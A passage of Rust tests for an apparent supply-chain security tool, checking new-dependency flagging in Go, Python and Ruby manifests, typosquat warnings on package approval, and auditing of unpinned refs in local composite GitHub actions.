            !result.messages.is_empty() || matches!(result.outcome, Outcome::Disabled),
            "{} produced no messages and is not disabled",
            def.id
        );
    }
}

/// End-to-end new-dependency detection across every non-Cargo/npm ecosystem.
/// The Cargo and npm paths are proven above; Go, Python, and Ruby manifests
/// must flag a freshly-added dependency at commit time through both the
/// baseline (`current_deps`, string parser) and staged-diff
/// (`new_unapproved_deps`, source-aware parser) code paths.
#[test]
fn new_dependencies_are_flagged_in_go_python_and_ruby_manifests() {
    struct Case {
        manifest: &'static str,
        baseline: &'static str,
        updated: &'static str,
        existing_qualified: &'static str,
        new_qualified: &'static str,
    }

    let cases = [
        Case {
            manifest: "go.mod",
            baseline: "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/pkg/errors v0.9.1\n)\n",
            updated: "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/pkg/errors v0.9.1\n\tgithub.com/spf13/cobra v1.8.0\n)\n",
            existing_qualified: "go:github.com/pkg/errors",
            new_qualified: "go:github.com/spf13/cobra",
        },
        Case {
            manifest: "requirements.txt",
            baseline: "requests==2.31.0\n",
            updated: "requests==2.31.0\nflask==3.0.0\n",
            existing_qualified: "pypi:requests",
            new_qualified: "pypi:flask",
        },
        Case {
            manifest: "Gemfile",
            baseline: "source 'https://rubygems.org'\ngem 'rails', '~> 7'\n",
            updated: "source 'https://rubygems.org'\ngem 'rails', '~> 7'\ngem 'sinatra'\n",
            existing_qualified: "rubygems:rails",
            new_qualified: "rubygems:sinatra",
        },
    ];

    for case in cases {
        let (_d, ctx) = repo();
        write(&ctx, case.manifest, case.baseline);
        stage(&ctx, case.manifest);
        git_ok(
            &ctx.root,
            &["commit", "-m", "chore: baseline", "--no-verify"],
        );

        // The string parser sees the committed baseline dependency.
        let current = deps::current_deps(&ctx).unwrap();
        assert!(
            current.contains(case.existing_qualified),
            "current_deps must see {} in {}: {current:?}",
            case.existing_qualified,
            case.manifest
        );

        // A newly-staged dependency is flagged as unapproved.
        write(&ctx, case.manifest, case.updated);
        stage(&ctx, case.manifest);
        let new_pkgs = deps::unapproved_new_packages(&ctx).unwrap();
        assert!(
            new_pkgs.contains(&case.new_qualified.to_string()),
            "new {} dependency must be flagged: {new_pkgs:?}",
            case.manifest
        );
        // The already-baselined dependency must not be re-flagged.
        assert!(
            !new_pkgs.contains(&case.existing_qualified.to_string()),
            "baselined {} dependency must not re-flag: {new_pkgs:?}",
            case.manifest
        );

        // Approving the new package clears the gate for that ecosystem.
        deps::approve_package(&ctx, case.new_qualified).unwrap();
        assert!(
            !deps::unapproved_new_packages(&ctx)
                .unwrap()
                .contains(&case.new_qualified.to_string()),
            "approval must clear {} gate",
            case.manifest
        );
    }
}

#[test]
fn approve_refuses_a_typosquat_without_force() {
    // Enforcement, not advice: `deps approve` must reject a typosquat unless the
    // human overrides on purpose. Offline so only the typosquat heuristic runs.
    let warnings = deps::approval_warnings("cargo:tokoi", true);
    assert!(
        warnings.iter().any(|w| w.contains("tokio")),
        "approval must warn on a typosquat: {warnings:?}"
    );
    // A clean name produces no warning.
    assert!(deps::approval_warnings("cargo:serde", true).is_empty());
}

#[test]
fn local_composite_actions_are_audited_for_unpinned_refs() {
    // Regression: `.github/actions/<x>/action.yml` was a blind spot — a local
    // composite action can pull in an unpinned third-party action.
    let (_d, ctx) = repo();
    write(
        &ctx,
        ".github/actions/setup/action.yml",
        "name: setup\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n",
    );
    let findings = audit::audit_repo(&ctx, false).unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f.file.contains(".github/actions/setup/action.yml")
                && f.message.contains("mutable ref")),
        "an unpinned ref inside a local composite action must be flagged: {findings:?}"
    );
}
